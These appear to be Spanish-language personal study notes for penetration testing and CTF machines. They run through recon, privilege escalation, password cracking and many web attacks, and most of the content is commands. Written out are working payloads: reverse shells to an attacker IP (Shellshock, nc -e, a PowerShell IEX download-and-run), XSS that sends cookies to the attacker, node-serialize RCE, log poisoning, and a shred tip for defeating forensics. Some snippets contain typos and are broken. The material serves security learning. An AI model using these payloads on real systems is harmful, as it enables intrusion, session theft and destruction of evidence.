"""
Al filtrar con grep si utilizamos el $ al final indicamos que quremos que termine necesariamente como
la cadena ingresada preaviamente y ^ para que empieze

cat /etc/passwd | grep sh$ | awk '{print $1}' FS=':'

chattr -----> controlar permisos avanzados 

?$ chattr +i -V
i ----> ni root podra borrar
-V ----> verbose
lsattr ---> listar permisos especiales

gtfobins.github.io ---> se puede buscar por comandos y vulneravilidades

Por ejemplo si el binario find tuviese permisos suid

find . -exec /bin/sh -p \; -quit

?$ uname -a  

?$ lsb_release -a

!Fuerza bruta al etc/shadow 

file_to_break_with_hash ----> pepe:$y$j9T$BbVQab3mplxKqVjR29TCl1$Ot4FnBujg9A/zT45LTJBjtc9dfwxmEK0MoJuBIrFDO0:19325:0:99999:7:::

?$ cat /etc/shadow | grep 'x' > {file_to_break_with_hash}

?$ john --wordlist=rockyou.txt {file_to_break_with_hash} 

?$ john --show {file_to_break_with_hash}

Identificar hashes

hash-identifier 
hashid {hash}

Si el archivo etc/passwd tiene permisos de escritura se puede alterar la contraseña

?$ openssl passwd 

Una vez tengamos el hash DES(Unix) podemos alterar el etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

root:{hash_passwd}:0:0:root:/root:/usr/bin/zsh

Scrip en C con root


-----

# include <stdio.h>

setuid(0)   <--- Esto porque en C existe una medida de seguridad

void main(){
    printf("Listando procesos (usr/bin/ps):");
    system("/usr/bin/ps);

    printf("Listando procesos (ps):");
    system("ps);
}

El archivo tendra SUID

El explotar una vulneravilidad y intentar escalar privilegios en un sistema puede ser desgastante, aca entran
en juego las persistencias, para que si llegaramos a apagar la maquina poder seguir teniendo conexion.
U otras como las persistencias privilegiadas...

Capabilities:

?$ getcap -r / 2>/dev/null 
Listar las capabilities desde la raiz

Por ejemplo podriamos tener la capabilitie de cap_setuid+ep en python en donde el atacante podria setearse la id de manera
exitosa para recobrar axeso como root al sistema

?$ python3 -c 'import os; os.setuid(0); os.sistem("/bin/bash")'
¿'
?$ setcap -r /usr/bin/pyhton3

?$ getcap

?$ setcap cap_setuid+ep

------------

?$ ping -c 1 {ip} -R  
-R <-- flag para mostrar el Recorod Route

nmp -p- -T5 --opne -n -v {ip} -oG {file_name}

nmap -sC -sV -p{ports} {ip} -oN {file_name}

?$ whatweb http://{ip}
Para ver lo más relevante de una app web

Para un escaneo más rapido 

?$ nmap -p- -oS- --min-rate 5000 --open -vvv -n -Pn {ip}
-Pn ---> no host discovery
-n ----> no resolución dns

#!/bin/bash

for port in $(seq 1 65535); do
    echo '' > /dev/tcp/{ip}/port && echo 'Port open'
done

Ctrl + z ----> pasar al segundo plano
kill % ---> matar al proceso enviado a segundo plano 

Identificar activos en tu segmento de red

#!/bin/bash

for i in $(seq 2 254); do
    timeout 1 bash -c "ping -c 1 {ip}.$i > dev/null 2>&1" && echo "Host {ip}.$i - ACTIVE"
done; wait

* NMAP
Enumerar puertos, vulneravilidades

updatedb

locate .nse      <----- scripts de nmap
locate .nse | wc -l    <---- Contar los scrips
locate .nse | xargs grep "categories"   <----- ver las categorias de los scripts
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

nmap -445 {ip} --script "vulnv and safe"
Escanear el port 445 de la ip ingresada con scripts de categorias vulnv and safe

*Listar directorios con nmap

nmap -p{port} {ip} --script http-enum

? Fuzing ---> fuerza bruta de urls 

Analizando el trafico

?$ tcpdump -i tun0 -w Captura.cap -v
interfaz tun0, exportar todo al archivo Captura.cap y verabose

?$ tshark -r Captura.cap 
Tshark nos traducira la captura de datos

?$ tshark -r -Y "http" Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

?$ tshark -r -Y "http" -Tjson Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http en formato json

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

xxd -ps ---> transformar a hexadecimal
xxd -ps -r ----> reversear de hexadecimal a legible

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap | xxd -ps -r | grep 'GET' | awk '{print $2}' | sort -u

! Fuzing 
*WFUZZ

?$ wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt http://{ip}/FUZZ
-c ---> outpu con colores
-L ----> si el codigo de estado es 301 y redirecciona, le indicamos que lo siga. follow redirec
-t ---> 400 hilos
--hc=404 ----> hide code 404
FUZZ en la url ----> donde quiero remplazar cada una de las palabras del diccionario en la url

--sc=200 ----> show code 
--sh=400 ----> + de 400 caracteres
--hh=4000 ----> ocultar respuestas con 4000 caracteres
--hl=160 ----> hide lines +160'

?$ echo -e "txt/nhtml/nphp/n" > extenciones.txt

?$ wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt -w extenciones.txt http://{ip}/FUZZ.FUZ2Z

doble fuzz, por cada una de las palabras del primer diccionario, probamos cada una de (en este caso extenciones) del segundo diccionario

*DIRBUSTER

GUI <-

*DIRB

?$ dirb {target} -w {wordlist}

*GOBUSTER

?$ gobuster dir -w {wordlist} --url {target}

*DIRSEAR

git clone
-h

Reconocimiento puede tratarse e fuzing, inspeccion visuall, herramientas de conocimientos, wapalizer, whatweb,
en función del gestor de contenido usar herramientas para dichos gestores.

Caso de ejemplo

?$ ping -c 1 {ip}

?$ nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- {ip} -oG allPorts
Escaneo a la ip 
-sS --> tcp sin port scan 
--open ---> solo ports abiertos
-vvv ---> info de lo que se va realizando
-n ----> sin resolucion dns 
-Pn ----> sin host discovery
-p- ---> todo el rango de puertos 
-oG ----> formato grepeable

?$ extractPorts allPorts

?$ nmap -sC -sV -p{ports} {ip} -oN targeted
Escaneo a los puertos enumerados
-sC --> lanzar una serie se scrips basicos
-sV ----> lanzar una serie de scrips basicos para intentar enumerar la version y el servicio

?$ whatweb http://{ip}

RECONOCEMOS QUE EL GESTOR DE CONTENIDO TIENE WordPress

En la pagina, vemos que esta rara, no cargan los contenidos, al clickear en un enlace el cual nos 
redirige a una url vemos que no carga. Si vemos el codigo fuente de la pagina (ctrl + u) vemos que esta  
url la cual no carga se utilizan para las imagenes las cuales tampoco vemos, entonces deducimos que estamos
frente a "VIRTUAL HOST ROUTING"

VIRTUAL HOST ROUTING ---> Permite contar con multiples servidores virtuales web desde una misma maquina.
Capacidad en base al DNS de alojar multiples servidores web, en funcion del dominio que especifiquemos nos carga
una web distinta

?$ echo "{ip} {url a la que quiero resolver que no se detecta}" | sudo tee -a /etc/hosts

Ahora con la web cargada, podriamos ver si el servidor cuenta con un WAF

WEB APLICATION FIREWALLW --> superviza, filtra o bloque trafico HTTP hacia y desde una web 

?$ wafw00f http://{page}

Recordemos que estamos contra un wordpress

Por lo que podriamos investigar "wordpress scanners pentesting"

Y vemos que tenemos un WPScan

Veriamos como usarla

?$ wpscan -hh  
-hh --> ver utilización

Para ver que usuarios existen en wordpress podemos ver los posts con los nombres, luego intentar loggearnos
y corroborar si avisa de que el usuario no existe o tira error de password

Y volviendo al wpscan

?$ wpscan --url http://{page} -e vp,u
vp ----> Vulnerable plugins
u ----> users

!EXPLOTACION 

?$ ping -c 1 {ip}

?$ mkt {name}

?$ cd nmap

?$ namp -p- -n -v -T5 --open {ip} -oG allPorts

?$ whatweb http://{ip}

?$ extractPorts allPorts

?$ nmap -sS -sV -p{ports} {ip} -oN targeted

?$ nmap --script http-enum -p{ports} {ip} -oN webScan

?$ wfuzz -c -t 300 --hc=404 -w /usr/share/worlist/dirbuster/dire...... http://{ip}/subdomain/FUZZ

Encuentra wp --> wordpress ---> wp-login.php <--- login de wordpress

?$ wpscan --url {url} --enumaerate vp,u

En algunos casos no se detecta de manera correcta las cosas, por eso es bueno saber que esta pasando por detras para poder 
hacerlo de manera manual, por ejemplo en este caso se da en base a los plugins de wp
Estos se suelen almacenar en http://{ip}/{subdomain}/wp/wp-content , no los vamos a poder ver debido a que la ruta no tiene
capacidad de directory listing, pero si nos sabemos el nombre podremos verlo, para ello podremos usar un diccionario del 
repositorio SecLists de danielmiessler, el cual clonamos

dentro de Discovery/Web-content/CMS existe el file wp-plugins.fuzz.txt, por lo  que con fuzz podemos hacerlo de manera manual

?$ wfuzz -c -t 300 --hc=404 -w  /opt/SecList/Discovery/Web-content/CMS/wp-plugins.fuzz.txt http://{ip}/{subdomain}/wp/FUZZ

Listamos los plugins y podemos buscar si para alguno de ellos existe una vulneravilidad

?$ searchsploit {plugin_name}

Esto devuelve si existe alguna vulnerabilidad, junto al path

?$ searchsploit -x {path}

Y esto te explica que hacer y como para explotar la vulnerabilidad 

?$ /usr/share/webshells/php/php-reverse-shell.php

!TRATAMIENTO TTY 

Cuando obtenemos una areverse shell, al presionar las teclas del teclado o el mismo ctrl + c no funciona de una manera 
normal, por lo que podemos hacer el tratamiento de la tty para poder asi trabajar comodos

?$ script /dev/null  -c bash

?$ ctrl + z 

?$ stty raw -echo

?$ fg

?$ reset

?$ xterm

?$ export TERM=xterm

?$ export SHELL=bash

Solo faltan setear las proporciones
-----

En una consola de NUESTRO sistema hacemos

?$ stty -a 
Para ver las filas y columnas

------

?$ stty rows {num_rows} columns {num_columns}

------


!IDENTIFICAR VULNERABILIDADES 

http://exploit-db.com  | searchsploit

?$ searchsploit -u
actualizarla herramienta 

?$ searchsploit {name} -w
Obtener la url

?$ searchsploit -x {path or code of exploit} 
Obtener el exploit

?$ searchsploit -m {path or code of exploit}
Descargar exploit 

!METASPLOIT

HFS ----> Http File Server

?$ msfdb run 
Inicializar por primera vez metasploit, crea user, inicializa db, corre postgres, etc

?$ search hfs

Copio la ruta del exploit

?$ use {rute}

?$ info
Informacion del exploit

?$ show options 
Ver opciones que se necesitan para explotar

?$ set {name} {value}

Ahora toca el listener
Con una sesion meterpreter, una sesion de escucha a travez de metasploit
?$ set payload windows/meterpreter/reverse_tcp

?$ exploit 

!MISMO EXPLOIT DE FORMA MANUAL

?$ searchsploit http file server

?$ searchsploit -m {code}

?$ locate nc.exe

?$ cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .

?$ python3 -m http.server 80

Modificamos el script con nuestra ip y el puerto

?$ nc -nvlp {port}

Ejecutamos el exploit

?$ python {ip} {port}


!BURPSUITE

Configurar el scope
shift + click en target ---> site map y proxy ---> HTTP history

options ---> [] Don't send items to Proxy history or live tasks, if out of scope

target ----> scope ---> add ---> url

!LFI --> Local File Inclucion

Wrapers:
expect:// --->   para ejecutar comandos
file:// ----->  para incluir archivos
php://filter/convert.base64-encode/resource

?$ echo "stdout a encodear" | base64
?$ echo "stdout a decodear(en base64)" | base64 -d

A travez de un LFI puede ser interesante ver si internamente la maquina se encuentra corriendo puertos, alojados en
/proc/net/tcp

!Log Poisoning

Consiste en una tecnica en la cual mediante una LFI convertimos a RFI, pudiendo asi ejecutar comandos de manera remota,
esto se podria dar si archivos como auth.log o acces.log dentro del dir de apache2 (todos dentro de /var/log) tuvieran
una mala configuracion permitiendo que otros puedan leer esto.

En el caso de acces.log lo que podemos hacer es modificar el User-Agent, desde burp, con el propio curl:

?$ curl {url} -H "User-Agent: <?php system('whoami'); ?>"

En el caso de auth.log que podriamos intentar registrarnos de la sig manera:

?$ ssh '<?php system('whoami'); ?>'@localhost
?$ Password: asjfkhakjsa

Ahora en el archivo auth.log estaria la resolucion del comando ingresado, incluso podriamos intentar tener una reverse shell

Nos ponemos en escucha en algun puerto, como por ej 443

Si bien sabemos que podriamos intentar entablar una reverse shell con nc, por ejemplo, con el comando

?$ nc -e /bin/bash {our_ip} 443

Php en algunos casos, explota por ejecutar este comando, por lo que podriamos intentar hacer lo sig

?$ echo "nc -e /bin/bash {our_ip} 443" | base64

?$ echo "stdout_anteriorcomando_enbase64" | base64 -d | bash 

!RFI (Remote File Inclución)

A diferencia del LFI, con el RFI podemos apuntar recursos de un 3ro y no necesariamente de la maquina local

Maquina con wordpress ---> TartarSauce, plugin vulnerable

?$ wfuzz -c -t 400 --hc=404 -w {url_wp-plugins.fuzz.txt en /opt/SecLists/Discovery/Web-Content/CMS} {url}/FUZZ

?$ searchsploit gwolle

?$ searchsploit -x 38861

La idea es que, el plugin, tiene una ruta vulnerable, por lo que si en la máquina vulnerable indicamos en la url
/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://{our_ip}

?$ python3 -m http.server 

?$ cp /usr/share/webshells/php/php-reverse-shell.php .

!HTML Injection y XSS (Cross-Site Scripting)
XSS ---> Es un tipo de vulnerabilidad informática o agujero de seguridad típico de las aplicaciones Web, que puede permitir a una
tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar.


En un panel de un página web, podriamos probar si el mismo es injectable a html

Por ejemplo <h1>TEST</h1>, <marquee>TEST</marquee>

Asi tambien como XSS

<script>alert("Haked by dobliuw")</script>

Si bien esto no es muy critico podriamos intentar hacer un cookie hijacking, es decir, secuestrar la sesión

?$ python3 -m http.server 

<script>document.write('<img src="http://{our_ip}/nashe.jpeg?cookie=' + document.cookie + '"/>')</script>

Esto injectado en una página haria que cada usuario que intenta cargar la imagen, nos daria su cookie

Con burpsuite podriamos hacer el cookie hijacking 

!CSRF ---> Cross-Site Request Forgery

Este exploit consta en hacer que la victima realiza una accion a nuestra voluntad

Con burpsuite, capturando una accion del usuario (un POST), con click derecho podemos cambiar el metodo de POST a GET

Por ejemplo si detectaramos que la accion de cambiar la password nos permite realizar un CSRF, podriamos copiar la ulr, achicarla,
pasarsela a la victima, la cual al estar registrada ejecutaria la accion que quisieramo sin darase cuenta en la mayoria de los
casos

!SSRF ---> Server-Site Request Forgery

En cambio, en este exploit, no necesitamos la interaccion del usuario.
Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de 
seguridad que van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante 
forzar al servidor web a realizar peticiones desde dentro del sistema hacia el exterior. Usando esas conexiones, los ataques de 
XSPA tratan de conocer, en base a las respuestas obtenidas, la lista de puertos que se encuentran abiertos o por el contrario 
cerrados en el servidor al que se fuerza la conexión.

Si una página web recibe una url para listar contenidos, podriamos probar si lo hace de manera local, y esto usarlo para intentar
descubrir los puertos abiertos que no se listan por el firewall, con un ataque por ejemplo en burpsuite de tipo sniper

!SQLI --> SQL Injection

*SQL Map: 

?$ sqlmap -u '{url}' --cookie '{cookie}' --dbs --batch --random-agent --dbms=mysql

Esto devuelve las bases de datos si es vulnerable, se randomisa el user agent e ingresamos el servicio

?$ sqlmap -u '{url}' --cookie '{cookie}' -D {db_name} --tables --batch --random-agent --dbms=mysql

Esto devuelve las tablas de la base de dato ingresada

?$ sqlmap -u '{url}' --cookie '{cookie}' -T {table_name} --columns --batch --random-agent --dbms=mysql

Esto devuelve las columnas de la tabla ingresada

?$ sqlmap -u '{url}' --cookie '{cookie}' -C {column1,column2} --dump --batch --random-agent --dbms=mysql

Esto devuelve los datos solicitado

----
Para obtener el dumpeo de todas las contraseñas y usuarios de la db en consola, lo podriamos hacer asi, donde
dice url iria la url con toda la injeccion y demas.
?$ curl -s "{url}" -H "Cookie: {cookie}" | html2text

Si la contraseña estubiese hasheada, podriamos user herramientas como hash-identifier para detectar ante que
hahsh estamos, o paginas como, hashes.org

!PADDING ORACLE ATTACK
Un padding oracle attack es un ciberataque criptográfico para el modo cbc (Cipher-block chaining) que permite descifrar un 
mensaje completo a partir de una dosis mínima de información acerca de su padding.

?$ padbuster {url} {valor_cookie} {num_bloques} -cookie  "{name_cookie}={valor_cookie}" -encoding 0

Devuelve el bloque recomendado para empezar a desencriptar
De esta manera habiendo desencriptado el cbc, podemos ver el formato de la misma, y siguiendo este formato, podriamos intentar
obtener la cookie

?$ padbuster {url} {valor_cookie} {num_bloques} -cookie "{name_cookie}={valor_cookie}" -econding 0 -plaintext "user=admin"

Cuando se trata de cifrado cbc, si hay un panel de login y registro, podriamos registrarnos como un usuario existente, de la manera
admin= o admin== la segunda vez

Podemos hacer un bit flipper attack
Nos registramos con un usuario similar al que buscamos (admin) por ejemplo (bdmin), hacemos un ataque de tipo snipper, seleccionando
a ojo como payload el principio de la cookie, como payloads hacemos un bit flipper, creamos una regex que filtre por quien estamos
registrados para asi saber, cuando dio con la convinatoria que computa la cookie de admin

!SHELL SHOCK

Si vemos extención cgi cuando intentamos registrarnos, podemos pensar en shellshock

Buscar en google shellshcok attack how atackers

Nos pondriamos en escucha por un puerto y remplazariamos el user agent

?$ curl {url} -H "User-Agent: () { :; }; /bin/bash -i &> /dev/tcp/{our_ip}/{port} 0>&1"

O lo mismo desde burpsuite tmb seria valido.

!XXE (XML External Enitity Injection)

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd">]>
&xxe;  

!DOMAIN ZONE TRANSFER

dig ---> Emitir peticiones a servidores DNS

?$  dig @{ip} {domain} ns  
Listar servidores ns

?$ dig @{ip} {domain} mx
Listar servidores de correo0

?$ dig @{ip} {domain} axfr
Lo que permite es (si el dominio es vulnerable) una lista de subdominios validos para el dominio ingresado

!DESERIALIZATION ATTACK
La serealizacion de la data, es un texto estructurado (JSON, XML, y YAML) o binario que se convierte en formato el caul
se pueda con servar por el dico.
En cambio la deseralizacion es el proceso inverso, en donde convertimos la data de formato legible para el disco, en un 
objeto estructurado o binario.

Cuando se logra deserealizar el input de un usuario es cuando se genera esta vulnerabilidad

Por ejemplo, tenemos una página web la cual al interceptarla, vemos que tiene una Cookie con una data en base 64, la cual vemos
al decodearla

?$ "cadena" | base64 -d; echo

y vemos que se trata de un objeto el cual general un mensaje en pantalla ("Hey Dummy 2+2 es 22"), por ejemplo

{"username": "Dummy", "country":"Argentina", "city": "San Martin", "num":"2"}

Por lo que podriamos intentar ver si cambiando algo del mismo cambia el mensaje en pantalla, de ser asi, la cosa pinta muy bien...

*File x
{"username": "Owen", "country":"Argentina", "city": "San Martin", "num":"2"}

?$ cat x | base64 -w 0; echo

Con la cadena serializada, podriamos cambiar la cookie, y vemos que el mensaje cambia a ("Hey Owen 2+2 es 22")

Deberiamos instalarnos algunas cosas

?$ curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -

?$ sudo apt install nodejs npm -y

Podriamos declarar una funcion con js

!__________FUNCTION____________
var y = {
    rce: function(){
        require('child_process').exec('', function(error, stdout, stderr){ console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
!______________________________

En donde debemos installar node-serialize

?$ npm install node-serialize

Este script nos va a permitir ejecutar comandos y serializarlos, indicandole el comando en exec('')

!__________EXAMPLE____________
var y = {
    rce: function(){
        require('child_process').exec('whoami', function(error, stdout, stderr){ console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
!______________________________

Y podrimos crear una funcion para deserealizar

!__________FUNCTION 2____________
var serealize = require('node-serealize')
var payload = {output de la funcion anterior}
serialize.unserialize(payload)
!______________________________

!__________EXAMPLE____________
var serealize = require('node-serealize')
var payload = '{"rce": "_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}"}'
serialize.unserialize(payload)
!______________________________

Para que funcione, la primera funcion deberia estar ejecutada

!__________CORRECCION____________
var y = {
    rce: function(){
        require('child_process').exec('whoami', function(error, stdout, stderr){ console.log(stdout) });
    }(), <---
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
!______________________________

y para el deserealizador, tmb

!__________EXAMPLE CORRECCION____________
var serealize = require('node-serealize')
var payload = '{"rce": "_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
serialize.unserialize(payload)                                                                                                                        |
!______________________________                                                                                                                       V
                                                                                                                                                     aca
Existen herramientas que crean una reverse shell por nodejs                                                                                                                                      
-------> gitHub ---> ajinabraham/Node.Js-Security-Course  

Al ejecutarlo pide ip y port(ambos nuestros)

Quedando de la sig manera

var serealize = require('node-serealize')
var payload = '{"rce": "_$$ND_FUNC$$_function(){`output_script_instalado`}()"}'
serialize.unserialize(payload) 

El output de esta función lo pasamos a base64, remplazamos la Cookie y tenemos reverseShell

!JUGGLING sobre panel de Login

El lenguaje de programación PHP presenta un comportamiento denominado type juggling, al realizar una comparación 
“loose (==)”. Esta comparación tiene un conjunto de reglas de conversión de operandos con las que primero intenta 
convertirlos a un tipo común y comparable.

Al comparar una cadena con un número, tratará de convertir la cadena en un número y luego realizará la comparación. 
Incluso, si ambos operandos parecen números, aunque sean cadenas, los convertirá a ambos en número y ejecutará la comparación
numérica. A continuación, se enlistan algunos ejemplos de comparaciones donde el resultado será verdadero:

• TRUE : “0000” == int(0)
• TRUE : “0e12” == int(0)
• TRUE : “0e12” == “0e98”
• TRUE : “0xF”   == “15”
• TRUE : “0e12” <= “1”

La anterior vulnerabilidad tiene una implicación específica para los hashes (MD5 y SHA1) que en PHP se codifican en base 16. 
Por ejemplo, al venir en forma “0e8578698…”, y como todos los siguientes caracteres después del “0e” son números, la cadena es
 interpretada como cero elevado a la potencia de algún valor. Por lo tanto, siempre tendrá un valor de cero.

Los magic hashes son aquellos que cumplen con la estructura “0+e[0-9]+” , como son:
• MD5(240610708) = 0e462097431906509019562988736854
• MD5(QNKCDZO) = 0e830400451993494058024219903391
• SHA1(10932435112) = 0e07766915004133176347055865026311692244

Un ejemplo de uso de magic hashes sería: al tomar la cadena “10932435112” y enviarla como contraseña 
(en un sistema que almacena sus contraseñas con SHA1), se va a comparar con el hash del valor real almacenado. 
Si ambos se procesan como “0”, el valor de retorno será verdadero y podrá iniciar sesión en la cuenta sin la contraseña válida.

Para ejecutar esta vulnerabilidad podriamos crearnos un script en php

!login.php____________________________
<html>
    <font color="red"><h1><marquee>Secure Login Page</marquee></h1></font>
    <hr>
    <body style="background-color:powderblue;">
        <center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']);?>">
            Usuario: <input type="text" name="usuario" id="usuario" size="60">
            &nbsp;
            Password: <inpu type="password" name="password" id="password" size="60">
            <input type="submit" value="Login">
        </form</center>

        <?php
            $USER = "admin";
            $PASSWORD = "3st4p<-_455w0rd!3s#1mp0s1bl3d3R0mp3r!,-asd!";

            if(isset($_POST['usuario']) && isset($_POST['password'])){
                if($_POST['usuario'] == $USER){
                    if(strcmp($_POST['password'], $PASSWORD) == 0){
                        echo "Welcome back";
                    } else {
                        echo "La contraseña es incorrecta";
                    }
                } else {
                    echo "El usuario no existe";
                }
            }

        ?>

    </body>
</html>
!___________________________

De esta manera, tenemos un propio script para verificar esta vulnerabilidad

Lo primero que deberiamos hacer posteriormente a enumerar los puertos, lo que tengo que hacer es enumerar los posibles usuarios

?$ wfuzz -c --hc=404 --hh=429 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' {url}

Vemos que existe el usuario admin, y como sabemos, cuando se compara en php con strcmp, podemos burlarlo con hashes MD5, etc 
O incluso lo que es peor, si vemos con el sig comando las respuestas obtenidas:

?$ curl -s -X POST --data 'usuario=admin&password=cualquiera' {url}

Vemos que la respuesta es que la password es incorrecta
Pero podriamos burlar la contraseña, o mejor dicho, la comparativa de php:

?$ curl -s -X POST --data 'usuario=admin&password[]=cualquiera' {url}

Con los [] por delante, no falta más.


!ESCALADA DE PRIVILEGIOS

*Abuso de SUDOERS

?$ useradd -d /home/pepe -s /bin/bash
?$ passwd pepe

?$ nano /etc/sudoers

pepe    ALL=(root) NOPASSWD: /usr/bin/zip

?$ sudo -l

De esta manera pepe puede ejecutar el comando zip como root sin proporcionar contraseñas

gtfobins.github.io ----> zip ---> sudo -----> exploit ---> TF=$(mktemp -d); sudo zip $TF /etc/hosts -T -TT 'sh #'; sudo rm $TF


* Abuso de SUID

?$ find / -perm -4000 2>/dev/null
gtfobins.github.io


* Abuso de CAPABILITIES

?$ setcap cap_setuid+ep /usr/bin/php7.3

?$ getcap /usr/bin/php7.3

?$ php7.3 -r "posix_setuid(0); system('/bin/bash');"

* Abuso de PATH HIJACKING y LIBRARY HIJACKING

Path hijacking ya sabemos que trata de secuestrar la variable de entorno path para que si hubieran ejecutados comandos de manera
realativa, alterar esto para poder asi ejecutar comandos maliciosos. 

Con python ocurre lo mismo, si importamos la libreria sys y le hacemos un print a sys.path, vamos a ver que siempre en primer
lugar intenta buscar los recursos importados desde el dir actual, por lo que si vemos un script x, como por ejemplo:

!______________
#!/usr/bin/python

import hashlib.py, sys

if len(sys.argv) != 2:
    print("[!] Ha ocurrido un error....")
    sys.exit(1)

if __name__ == "__main__":
    palabra = sys.argv[1]

    md5 =  hashlib.md5(palabra).hexdigest()
    print(md5)
!_______________

Lo que podriamos hacer es teniendo en cuenta el anterior concepto, es crear un archivpo en la carpeta en la cual se encuentra el 
mismo, o si hubiesen permisos de escritura en librerias mostradas en el print de sys.path, crear el archivo malicioso "hashlib.py"

?$ nano hashlib.py

!_____MALICIUS FILE__________
import os

os.setuid(0)
os.system('/bin/bash')
!___________________________


* Abuso del KERNEl

?$ uname -a

Vemos la version del kernel, y supongamos que vemos la version 2.6.31

Podriamos googlear 2.6.31 exploit kernel

Vemos que existe un exploit por ejemplo, en c, el cual crea una contraseña nueva y migra al usuario nuevo que se crea
firefarx y se remplaza como root

!RECONOCIMIENTO DEL SISTEMA

Una buena herramienta es ---> https://github.com/diego-treitos/linux-smart-enumeration

"""


"""
Podemos entender mejor el concepto de LFI (Local File Inclusion) haciendolo en nuestra propia maquina

?$ cd /var/www/html 

?$ service apache2 start

?$ ps -faux  <-- procesos

?$ nano index.php

<?php1
    $filename = $_REQUEST['page']; || $filename = $_GET['page'];
    include($filename); || include("/var/www/html/" . $filename);
?>

Si en algun  momento usase este codigo, se aceptaria una query la cual podria tener de valores comandos

----------------------------------------------------------------------

<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

Nos podriamos poner en escucha en un puerto, y probar distintos payloads de aca 
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

NOTA: Antes que un rm cuando comprometemos un sistema para borrar un archivo php creado por ejemplo, lo que podriamos 
hacer es 
?$ shrd -zun 10 -v {file_name}
Esto para borrar la tabla de indices, para que no sea recuperable por tecnicas forenses

! Reverse shell con nc en Windows: 

Escuchar el port --> stty raw -echo; (stty size; cat) | nc -lvnp {port}
Enviar la shell con Powershell ---> IEX(IWR http://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtySehll.ps1
 -UseBasicParsing); Invoke-ConPtyShell {our_ip} {port}
"""